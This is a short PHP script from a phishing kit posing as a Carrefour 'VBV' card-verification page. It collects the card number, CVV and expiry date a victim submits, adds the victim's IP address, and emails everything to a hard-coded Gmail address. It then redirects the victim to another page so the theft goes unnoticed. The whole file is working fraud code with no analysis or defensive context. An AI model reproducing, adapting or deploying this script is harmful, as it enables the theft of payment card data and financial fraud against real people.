<?php 

$ip = getenv("REMOTE_ADDR"); 
$browser = getenv ("HTTP_USER_AGENT"); 

$message .= "===================| CARREFOUR   VBV |===================\n"; 
$message .= "Carte                 : ".$_POST['carta1']."\n"; 
$message .= "Cv3                   : ".$_POST['cvv1']."\n"; 
$message .= "Exp Dat               : ".$_POST['exp1']."\n"; 
$message .= "============================CARREFOUR  =========================\n";  

$to = "louannedu490@gmail.com"; 
$subj = " CF Full ||".$ip."\n"; 
$from = "From: CF <dmeterco@p3plcpnl0992.prod.phx3.secureserver.net>"; 
mail($to, $subj, $message, $from); 


header("Location: INFORMATION.htm"); 



?> 